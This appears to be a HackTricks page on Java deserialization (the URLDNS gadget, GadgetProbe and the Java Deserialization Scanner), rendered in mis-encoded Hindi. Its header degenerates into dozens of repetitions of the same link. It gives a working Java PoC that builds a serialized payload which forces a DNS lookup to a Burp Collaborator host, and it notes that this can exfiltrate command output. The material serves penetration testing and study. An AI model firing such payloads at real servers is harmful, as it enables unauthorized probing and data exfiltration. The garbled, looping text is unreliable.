# рдЬрд╛рд╡рд╛ DNS рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди, рдЧреИрдЬреЗрдЯрдкреНрд░реЛрдм рдФрд░ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реНрдХреИрдирд░

## рдЬрд╛рд╡рд╛ DNS рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди, рдЧреИрдЬреЗрдЯрдкреНрд░реЛрдм рдФрд░ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реНрдХреИрдирд░

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PR рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ** [**
```java
public final class URL implements java.io.Serializable {
```
рдЗрд╕ рдХрдХреНрд╖рд╛ рдореЗрдВ рдПрдХ **рдЕрдЬреАрдм рд╡реНрдпрд╡рд╣рд╛рд░ рд╣реЛрддрд╛ рд╣реИред** рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рд╕реЗ: "**рджреЛ рд╣реЛрд╕реНрдЯ рдмрд░рд╛рдмрд░ рдорд╛рдиреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдЕрдЧрд░ рджреЛрдиреЛрдВ рд╣реЛрд╕реНрдЯ рдирд╛рдореЛрдВ рдХреЛ рдПрдХ рд╣реА рдЖрдИрдкреА рдкрддреЗ рдореЗрдВ рд░реЗрдЬрд╝реЛрд▓реНрд╡ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**"ред\
рдлрд┐рд░, рд╣рд░ рдмрд╛рд░ рдЬрдм рднреА рдПрдХ URL рдСрдмреНрдЬреЗрдХреНрдЯ **рдХрд┐рд╕реА рднреА** **рдлрдВрдХреНрд╢рди `equals`** рдпрд╛ **`hashCode`** рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рдПрдХ **DNS рдЕрдиреБрд░реЛрдз** рдЖрдИрдкреА рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред

**URL** рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ **`hashCode`** рдлрдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ, рдЗрд╕рдХреЗ рд▓рд┐рдП рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдПрдХ `HashMap` рдореЗрдВ рдбрд╛рд▓рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ рдЬреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, `HashMap` рдХреЗ **`readObject`** рдлрдВрдХреНрд╢рди рдХреЗ рдЕрдВрдд рдореЗрдВ рдпрд╣ рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
рдпрд╣ **рдЪрд▓ рд░рд╣рд╛ рд╣реИ** `HashMap` рдХреЗ рднреАрддрд░ рд╣рд░ рдорд╛рди рдХреЗ рд╕рд╛рде `putVal` рдХреЛ **рдЪрд▓рд╛рдПрдЧрд╛**ред рд▓реЗрдХрд┐рди, рдЕрдзрд┐рдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ `hash` рдХреЛ рд╣рд░ рдорд╛рди рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдирд╛ред рдпрд╣ `hash` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдХреЛрдб рд╣реИ:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, **рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рддреЗ рд╕рдордп** рдПрдХ **`HashMap`** рдХреЛ **рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддреЛ `hash` рдлрд╝рдВрдХреНрд╢рди рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╕рд╛рде **рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛** рдФрд░ **`hash`** рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди **рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ `.hashCode()` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **URL рдСрдмреНрдЬреЗрдХреНрдЯ** рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ **`HashMap`** рдХреЛ **рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВ**, рддреЛ **URL рдСрдмреНрдЬреЗрдХреНрдЯ** `.hashCode()` рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**ред

рдЕрдм, рд╣рдо `URLObject.hashCode()` рдХреЗ рдХреЛрдб рдХреА рдУрд░ рджреЗрдЦрддреЗ рд╣реИрдВ:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдм рдПрдХ `URLObject` `.hashCode()` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ `hashCode(this)` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХреЛрдб рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ `getHostAddress` рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **рдПрдХ DNS рдХреНрд╡реЗрд░реА рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдПред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдХреНрд▓рд╛рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рджрд┐рдЦрд╛ рд╕рдХреЗ рдХрд┐ **рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рд╕рдВрднрд╡ рд╣реИ, рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХреЗ** (рдЖрдк рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╕рдмрдбреЛрдореЗрди рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ)ред

### URLDNS рдкреЗрд▓реЛрдб рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЖрдк [рдпрд╕реЛрд╕реАрд░рд┐рдпрд▓ рд╕реЗ URLDNS рдкреЗрд▓реЛрдб рдХреЛрдб рдпрд╣рд╛рдВ](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ рдХреЛрдб рдХрд░рдиреЗ рдХреЛ рд╕рдордЭрдиреЗ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ PoC рдмрдирд╛рдпрд╛ рд╣реИ (рдпрд╕реЛрд╕реАрд░рд┐рдпрд▓ рдХреЗ рдЖрдзрд╛рд░ рдкрд░):
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ рдереА рдХрд┐ рдереА рдХрд┐ рдЬреАрдореЗрд▓ рдХрд▓реЗрдХреНрд╢рдиреНрд╕ рдкреЗрд▓реЛрдб рдХреЛ рдбреАрдПрдирдПрд╕ рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдХрдо рд╕реБрд░рдХреНрд╖рд┐рдд рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдкреЛрд╕реНрдЯ рд╣реИ: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

рдЖрдк [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) рдХреЛ рдмрд░реНрдк рд╕реНрдпреВрдЯ рдРрдк рд╕реНрдЯреЛрд░ (рдПрдХреНрд╕рдЯреЗрдВрдбрд░) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**GadgetProbe** рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдХреБрдЫ **рдЬрд╛рд╡рд╛ рдХрдХреНрд╖рд╛рдПрдВ** рд╕рд░реНрд╡рд░ рдХреА рдЬрд╛рд╡рд╛ рдХрдХреНрд╖рд╛ рдкрд░ рдореМрдЬреВрдж рд╣реИрдВ, рддрд╛рдХрд┐ рдЖрдк рдЬрд╛рди рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдХрд┐рд╕реА рдЬреНрдЮрд╛рдд рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓** рд╣реИред

### рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ

**GadgetProbe** рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреЗ **рдбреАрдПрдирдПрд╕ рдкреЗрд▓реЛрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди **рдбреАрдПрдирдПрд╕ рдХреНрд╡реЗрд░реА** рдЪрд▓рд╛рдиреЗ рд╕реЗ **рдкрд╣рд▓реЗ** рдпрд╣ рдПрдХ **рдЕрдирд┐рд╢реНрдЪрд┐рдд рдХрдХреНрд╖рд╛ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред рдпрджрд┐ **рдЕрдирд┐рд╢реНрдЪрд┐рдд рдХрдХреНрд╖рд╛ рдореМрдЬреВрдж рд╣реИ**, рддреЛ **рдбреАрдПрдирдПрд╕ рдХреНрд╡реЗрд░реА** рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдФрд░ GadgetProbe рдпрд╣ рдиреЛрдЯ рдХрд░реЗрдЧрд╛ рдХрд┐ рдпрд╣ рдХрдХреНрд╖рд╛ рдореМрдЬреВрдж рд╣реИред рдпрджрд┐ **рдбреАрдПрдирдПрд╕** рдЕрдиреБрд░реЛрдз рдХрднреА рдирд╣реАрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рдЕрдирд┐рд╢реНрдЪрд┐рдд рдХрдХреНрд╖рд╛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдирд╣реАрдВ рд╣реБрдИ** рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╛ рддреЛ рдпрд╣ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдпрд╛ рдпрд╣ **рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА/рд╢реЛрд╖рдгреАрдп** рд╣реИред

рдЧрд┐рдердм рдХреЗ рдЕрдВрджрд░, [**GadgetProbe рдХреЗ рдкрд╛рд╕ рдХреБрдЫ рд╢рдмреНрдж рд╕реВрдЪрд┐рдпрд╛рдБ рд╣реИрдВ**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) рдЬрд┐рдиреНрд╣реЗрдВ рдЬрд╛рд╡рд╛ рдХрдХреНрд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реНрдХреИрдирд░

рдпрд╣ рд╕реНрдХреИрдирд░ рдмрд░реНрдк рдРрдк рд╕реНрдЯреЛрд░ (рдПрдХреНрд╕рдЯреЗрдВрдбрд░) рд╕реЗ **рдбрд╛рдЙрдирд▓реЛрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдореЗрдВ **рдкреИрд╕рд┐рд╡** рдФрд░ рд╕рдХреНрд░рд┐рдп **рдХреНрд╖рдорддрд╛рдПрдВ** рд╣реЛрддреА рд╣реИрдВред

### рдкреИрд╕рд┐рд╡

